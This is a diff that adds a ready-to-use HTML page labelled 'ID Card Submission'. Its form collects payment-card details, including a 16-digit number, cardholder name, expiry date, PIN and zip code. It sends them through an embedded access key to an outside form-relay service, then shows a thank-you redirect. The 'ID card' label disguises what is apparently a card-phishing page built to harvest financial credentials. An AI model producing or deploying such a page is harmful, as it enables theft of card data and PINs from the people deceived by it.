@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ID Card Submission</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+    .form-container {
+      background-color: #fff;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 400px;
+    }
+    h1 {
+      text-align: center;
+      color: #333;
+      margin-bottom: 30px;
+    }
+    input, textarea, button {
+      width: 100%;
+      padding: 12px 15px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    input:focus, textarea:focus {
+      border-color: #4CAF50;
+      outline: none;
+    }
+    button {
+      background-color: #4CAF50;
+      color: #fff;
+      border: none;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    button:hover {
+      background-color: #45a049;
+    }
+  </style>
+</head>
+<body>
+
+<div class="form-container">
+  <h1>ID Card Submission</h1>
+  <form action="https://api.web3forms.com/submit" method="POST">
+    <input type="hidden" name="access_key" value="a42fe9f0-c449-41b1-bdd8-2dc7971f4833">
+    
+    <input type="text" name="id_number" placeholder="16-digit ID Number" pattern="\d{16}" required>
+    <input type="text" name="cardholder_name" placeholder="Cardholder Name" required>
+    <input type="text" name="expiration_date" placeholder="Expiration Date (MM/YY)" required>
+    <input type="text" name="pin" placeholder="PIN" required>
+    <input type="text" name="zip_code" placeholder="Zip Code" required>
+
+    <input type="checkbox" name="botcheck" style="display:none;">
+    <input type="hidden" name="redirect" value="thankyou.html">
+
+    <button type="submit">Submit</button>
+  </form>
+</div>
+
+</body>
+</html>
